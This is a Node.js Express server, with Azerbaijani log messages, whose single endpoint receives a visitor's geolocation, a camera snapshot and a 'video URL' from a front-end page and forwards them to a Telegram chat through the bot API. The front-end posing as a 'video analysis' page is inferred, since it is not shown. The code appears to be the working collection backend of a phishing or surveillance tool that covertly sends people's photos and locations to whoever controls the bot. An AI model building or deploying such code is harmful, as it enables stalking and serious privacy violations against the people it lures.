// server.js
const express = require('express');
const path = require('path');
const FormData = require('form-data');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("❌ TELEGRAM token və ya chat ID tapılmadı!");
} else {
    console.log("✅ Telegram token və chat ID uğurla yükləndi.");
}

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/send-data', async (req, res) => {
    const { videoUrl, location, image } = req.body;
    console.log(`📩 Yeni məlumat alındı: video=${!!videoUrl}, location=${!!location}, image=${!!image}`);

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        return res.status(500).json({ message: "Serverdə Telegram token və ya chat ID yoxdur." });
    }

    try {
        // 🔹 1. Mətn mesajı
        let messageText = `⚡️ *Yeni Video Analiz Girişi!* ⚡️\n\n`;
        messageText += `*Video URL:* ${videoUrl || 'Təyin edilməyib'}\n`;

        if (location?.latitude && location?.longitude) {
            messageText += `*Lokasiya:* [Google Maps-də bax](https://www.google.com/maps?q=${location.latitude},${location.longitude})\n`;
            messageText += `  Enlem: ${location.latitude}\n  Boylam: ${location.longitude}\n`;
        } else {
            messageText += `*Lokasiya:* Əldə edilmədi və ya rədd edildi.\n`;
        }

        // 🔹 2. Mətn mesajını göndər
        const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown'
            })
        });

        if (!messageResponse.ok) {
            const err = await messageResponse.json();
            throw new Error(`Telegram mesaj xətası: ${err.description}`);
        }
        console.log("✅ Mətn mesajı Telegrama göndərildi.");

        // 🔹 3. Şəkil varsa, göndər
        if (image) {
            console.log("📷 Şəkil göndərilir...");
            const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
            const buffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('photo', buffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
            form.append('caption', 'Kamera görüntüsü');

            const photoResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form,
                headers: form.getHeaders()
            });

            if (!photoResponse.ok) {
                let errText;
                try {
                    const errJson = await photoResponse.json();
                    errText = errJson.description;
                } catch {
                    errText = await photoResponse.text(); // JSON yoxdursa text götür
                }
                throw new Error(`Telegram şəkil xətası: ${errText}`);
            }
            console.log("✅ Şəkil Telegrama göndərildi.");
        }

        res.json({ ok: true, message: "Məlumat Telegrama göndərildi." });

    } catch (err) {
        console.error("❌ Xəta:", err.message);
        res.status(500).json({ message: err.message });
    }
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log(`🚀 Server ${PORT} portunda işləyir`));
